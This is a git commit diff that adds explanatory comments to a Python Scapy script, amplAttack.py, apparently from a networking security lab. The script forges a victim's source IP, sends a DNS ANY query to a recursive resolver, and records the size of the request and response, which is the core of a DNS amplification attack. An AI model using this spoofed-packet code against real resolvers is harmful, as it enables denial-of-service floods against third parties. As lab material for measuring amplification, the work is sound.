43bb5352211d2146a4e1f6595f59e9e488cd65bc
Sarah Akbar <sarahakbar@192.168.10.7>
2020-11-21 23:34:38 -0500

    Added some comments

--- miss2/dnsAmplification/amplAttack.py
+++ miss2/dnsAmplification/amplAttack.py
@@ -5,15 +5,15 @@ nameserver = "10.21.4.1" # DNS server - here we'll target the recursor specifica
 domain     = "fakesite.com" # Some domain name like "google.com" etc.
 
 print("Starting the amplification attack!")
-ip  = IP(src=target, dst=nameserver)
-udp = UDP(dport=53)
-dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))
+ip  = IP(src=target, dst=nameserver) #Set up the IP portion
+udp = UDP(dport=53) #We will be sending this over UDP
+dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255)) #Craft the DNS packet with qType=255, meaning that the "all" flag is enabled
 
-request = (ip/udp/dns)
+request = (ip/udp/dns) #Create the entire request
  
-query = sr1(request,verbose=False, timeout=8)
+query = sr1(request,verbose=False, timeout=8) #Send the request and receive a response
 
-result_dict = {
+result_dict = { #struct with all the data we need from our response 
   'dns_destination':nameserver,
   'query_type':"All",
   'query_size':len(request),
